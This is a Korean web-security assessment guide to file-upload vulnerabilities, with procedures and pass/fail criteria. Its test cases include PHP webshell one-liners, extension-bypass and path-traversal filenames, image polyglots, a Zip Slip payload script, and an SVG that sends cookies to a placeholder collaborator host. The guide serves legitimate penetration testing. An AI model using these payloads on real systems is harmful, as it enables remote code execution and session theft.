---
sidebar_position: 16
title: 파일 업로드
description: 웹 진단 - 파일 업로드 점검 절차, 확장자/Content-Type/Magic byte 우회, 웹쉘·SVG XSS·Zip Slip 케이스, 판정 기준
keywords: [File Upload, Webshell, 웹쉘, 확장자 우회, Polyglot, Zip Slip, Stored XSS, SVG, OWASP A08]
draft: false
---

# 파일 업로드
> 사용자가 업로드한 파일이 검증·격리 없이 저장·서빙되어 **웹쉘(RCE) / Stored XSS / 임의 위치 파일 쓰기** 로 이어지는 취약점.
> 단일 결함만으로 시스템 전체 침해까지 가능한 고위험 항목.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A08:2025 - Software and Data Integrity Failures (실질 영향은 A05 Injection · A01 Access Control 영역과도 겹침) / KISA 입력값 검증 |
| **CWE** | [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html), CWE-22 (파일명 traversal), CWE-79 (SVG Stored XSS) |
| **영향도** | 🔴 매우 높음 (웹쉘 → RCE) / 🟡 (실행 불가 디렉토리 저장) |
| **점검 난이도** | 하 (단일 검증) / 상 (다중 검증 + 처리 라이브러리 우회) |
| **예상 점검 시간** | 30분 ~ 4시간 |

---

## 점검 목적

업로드 기능에서 **확장자 / Content-Type / Magic byte / 파일명 / 저장 경로 / 실행 가능성** 이 모두 적절히 통제되는지 확인한다. 단계 중 하나라도 누락되면 **웹쉘 업로드 → RCE**, **SVG Stored XSS → 관리자 세션 탈취**, **파일명 Path Traversal → 임의 위치 파일 쓰기** 등으로 이어진다.

---

## 유형 구분

| 유형 | 핵심 | 파급 |
| :--- | :--- | :--- |
| **웹쉘 업로드 → RCE** | 확장자/MIME/Magic byte 검증 우회 + 실행 가능 디렉토리 저장 | 🔴 시스템 침해 |
| **파일명 Path Traversal** | 파일명에 `../` 포함 → 임의 디렉토리 저장/덮어쓰기 | 🔴 임의 파일 쓰기 |
| **파일명 Stored XSS** | 파일명에 `<script>` 등 → 게시판/관리자 페이지에서 출력 시 발현 | 🟡 ~ 🔴 |
| **SVG 업로드 → Stored XSS** | SVG는 XML이고 JS 실행 가능. 이미지 업로드 폼에서 자주 통함 | 🔴 (관리자 세션 탈취) |
| **압축 파일 — Zip Slip** | ZIP 항목명에 `../` 포함 → 자동 해제 시 임의 위치 쓰기 | 🔴 RCE까지 가능 |
| **처리 라이브러리 CVE** | ImageMagick "ImageTragick", Ghostscript 등 알려진 취약점 | 🔴 RCE |

---

## 진단 절차

### Step 1. 진입점 식별

업로드가 발생하는 모든 기능을 후보로:

- 프로필 사진 / 아바타
- 게시판 첨부파일, 댓글 이미지, 마크다운 에디터 이미지 첨부
- 문서 / 이미지 업로드 (워드 첨부, 명함 등록 등)
- CSV / Excel **import**
- 압축 파일(ZIP/TAR) 업로드 + **자동 해제** 기능
- 백업 파일 **복원** 기능

### Step 2. 검증 메커니즘 식별

정상 파일과 차단되는 파일을 비교하면서 **어디서 검증되는지** 파악:

| 검증 위치 | 식별 방법 | 우회 난이도 |
| :--- | :--- | :--- |
| 클라이언트 (HTML `accept=`, JS) | Burp Repeater로 직접 보내면 통과 | 즉시 우회 |
| 서버 — 확장자 블랙리스트 | `.php` 차단되지만 `.phtml` 통과 | 케이스 2 |
| 서버 — 확장자 화이트리스트 | 화이트리스트 외 모두 차단 | 어려움 (이중 확장자, MIME 위조 시도) |
| 서버 — Content-Type만 검증 | 헤더 변조 시 통과 | 케이스 3 |
| 서버 — Magic byte (시그니처) | 첫 바이트만 보면 Polyglot 가능 | 케이스 4 |

### Step 3. 우회 시도

식별된 검증에 맞춰 케이스 1~5 시도.

### Step 4. 저장 위치 / 접근 가능성 확인

업로드만 되고 끝이 아니라, **공격자가 그 파일에 도달 가능한지** 확인:

- 업로드 응답에 파일 경로가 노출되는가? (`{"url": "/uploads/abc.php"}`)
- 응답에 경로가 없어도 추측 가능한 위치인가? (`/uploads/<원본 파일명>`, `/files/<userId>/<filename>`)
- 직접 URL 호출 시 **서버에서 실행되는가**, 단순 다운로드되는가? (Content-Type, X-Content-Type-Options)
- 별도 도메인/CDN에서 서빙되는가? (영향도 차이)

### Step 5. 영향 입증

- 웹쉘: 직접 호출 → `?cmd=id` 응답에 명령 결과 출력
- SVG XSS: 다른 사용자/관리자 세션에서 해당 SVG 페이지 열람 시 alert 발현 (또는 Collaborator 콜백)
- Path Traversal: 의도되지 않은 디렉토리에 파일 생성 확인 (가능하면 admin이 접근하는 경로 노림)

---

## 페이로드 / 테스트 케이스

### 케이스 1: 클라이언트 검증만 우회

**언제 쓰는지**: 가장 흔한 케이스. HTML `<input accept="image/*">` 또는 JS validation만 적용된 폼은 Burp로 즉시 우회.

```
1. 정상 이미지(.jpg) 업로드 → Burp에서 인터셉트
2. 멀티파트 본문의 filename을 shell.php 로 변경
3. 본문(이미지 바이트) 을 PHP 코드로 교체
4. Forward
```

**판정**: 서버 응답이 정상 200이면 클라이언트 검증만 적용 = 취약. 케이스 4의 저장 위치/실행 가능성 확인으로 이어짐.

### 케이스 2: 확장자 화이트/블랙리스트 우회

**언제 쓰는지**: 서버에서 `.php` 가 명확히 차단되지만 다른 변형이 통과될 가능성이 있을 때.

```
# 대소문자
shell.PhP
shell.PHP

# 이중 확장자
shell.php.jpg
shell.jpg.php

# 특수 PHP 확장자
shell.phtml
shell.phar
shell.pht
shell.php5
shell.php7
shell.phps

# Trailing 점/공백
shell.php.
shell.php (공백)

# Apache .htaccess 업로드로 임의 핸들러 추가
.htaccess 업로드:
  AddType application/x-httpd-php .jpg
→ shell.jpg (PHP 코드 포함) 가 PHP로 실행됨
```

**판정**: 위 변형 중 하나가 업로드 성공 + 직접 호출 시 PHP 실행되면 취약.

> Null byte 파일명(`shell.php%00.jpg`) 은 PHP 5.3.4(2010) 이후 거의 안 통함. 옛날 시스템에서만 시도.

### 케이스 3: Content-Type 헤더만 검증

**언제 쓰는지**: 서버가 multipart의 `Content-Type` 헤더만 보고 판단할 때. Burp에서 헤더만 변조하면 통과.

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg     ← 헤더만 image/jpeg로, 본문은 PHP 코드

<?php system($_GET['cmd']); ?>
------X--
```

**판정**: 업로드 성공 + 직접 호출 시 PHP 실행되면 Content-Type만 검증 = 취약.

### 케이스 4: Magic byte 위조
**언제 쓰는지**: 서버가 파일의 첫 바이트(시그니처) 만 검사할 때. 이미지 헤더 + 코드를 결합한 Polyglot 파일로 통과.

**GIF + PHP:**

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

**JPEG + PHP** (실제 JPEG 헤더 바이트 + EXIF 주석에 PHP 코드 삽입 — `exiftool` 활용):

```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" cat.jpg
mv cat.jpg shell.php.jpg     # 이중 확장자 케이스와 결합
```

**판정**: 업로드 후 직접 호출 시 명령 실행되면 취약. 이미지 자체는 정상으로 미리보기까지 보일 수 있어 탐지가 더 어려움.

### 케이스 5: 파일명 Path Traversal

**언제 쓰는지**: 서버가 multipart의 `filename` 을 그대로 저장 경로에 사용할 때.

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

```http
Content-Disposition: form-data; name="file"; filename="..\..\..\Windows\Temp\shell.aspx"
```

**판정**: 응답에 저장 경로가 노출되거나, 의도하지 않은 위치(웹 루트 등)에서 파일 호출 시 응답되면 취약. **임의 파일 덮어쓰기**로 기존 파일 변조 가능성도 확인.

### 케이스 6: 파일명 Stored XSS

**언제 쓰는지**: 게시판/관리자 페이지에서 업로드된 파일 목록을 표시할 때, 파일명이 인코딩 없이 출력되는 경우.

```
파일명: <img src=x onerror=alert(document.cookie)>.jpg
파일명: "><svg onload=alert(1)>.png
```

**판정**: 업로드 후 게시판/관리자 페이지에서 해당 파일명이 출력되는 페이지 열람 시 JS 실행되면 취약. XSS 페이지의 Stored XSS 판정 흐름과 동일하게 확인.

### 케이스 7: SVG 업로드 → Stored XSS
**언제 쓰는지**: 프로필 사진/아바타/이미지 업로드 폼이 SVG를 허용할 때. SVG는 XML이라 `<script>` 와 이벤트 핸들러를 포함할 수 있음.

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script type="text/javascript">
    fetch('https://<COLLAB>/?c=' + document.cookie);
  </script>
</svg>
```

**판정**: 업로드 후 SVG가 직접 URL(`<img>` 태그가 아니라 a 링크 또는 직접 접속) 로 열릴 때 JS 실행. 서비스에서 프로필 이미지 미리보기를 `<img src=...>` 가 아니라 직접 페이지로 띄우면 발현. Collaborator 콜백으로도 입증 가능.

> 이미지 업로드 폼에서 SVG가 허용되면 **거의 무조건 시도**. 실무 진단에서 빈번하게 발견되는 케이스.

### 케이스 8: Zip Slip — 압축 파일 자동 해제

**언제 쓰는지**: ZIP/TAR 업로드 후 서버가 **자동으로 압축 해제**하는 기능이 있을 때 (백업 복원, 테마 업로드, 일괄 import 등).

**페이로드 ZIP 생성:**

```bash
# shell.php 준비
echo '<?php system($_GET["c"]); ?>' > shell.php

# ZIP 내부 항목명에 traversal 포함시키기
python3 -c "
import zipfile
z = zipfile.ZipFile('payload.zip', 'w')
z.write('shell.php', '../../../../var/www/html/shell.php')
z.close()
"
```

**판정**: 업로드 + 자동 해제 후 `<TARGET>/shell.php?c=id` 응답에 명령 결과 출력되면 RCE 입증. 해제 결과로 시스템 파일이 덮어써질 수도 있으므로 운영 환경에서는 **반드시 사전 협의**.

### 그 외 — 짧게 언급만
- **ImageMagick "ImageTragick" (CVE-2016-3714)** — MVG/MSL 처리 시 RCE. 패치된 환경 다수지만 ImageMagick 사용 환경이면 버전(`convert -version`) 확인 권고
- **Ghostscript 관련 CVE** — PostScript/PDF 처리 라이브러리 RCE. PDF 변환 기능이 있으면 버전 확인
- **`phar://` wrapper** — PHP 한정. 직렬화 객체 트리거 가능
- **Zip Bomb** — DoS 카테고리, 보고서에서 별도 다루는 경우 적음

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 웹쉘(.php/.phtml/.phar/.aspx/.jsp) 업로드 후 **직접 URL 호출 시 명령 실행**
- [ ] SVG 업로드 후 다른 사용자 세션에서 **JS 실행 또는 Collaborator 콜백**
- [ ] 파일명에 `../` 포함 시 **의도하지 않은 디렉토리에 저장**
- [ ] ZIP 자동 해제 시 traversal 항목으로 **임의 위치에 파일 생성**
- [ ] 파일명에 HTML 페이로드 포함 시 **목록 페이지에서 JS 실행**

**오탐 주의 (다음은 위험도 낮음):**

- [ ] 위험 파일이 업로드되더라도 **실행 불가 디렉토리** (별도 도메인, `application/octet-stream` 강제 다운로드, X-Content-Type-Options nosniff) — 영향도 🟡 로 보고
- [ ] 업로드 후 **랜덤 파일명으로 재명명** + **추측 불가능** + **인덱스 페이지 차단** — 도달 자체가 불가하면 위험도 낮음

---

## 참고자료

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [Snyk - Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
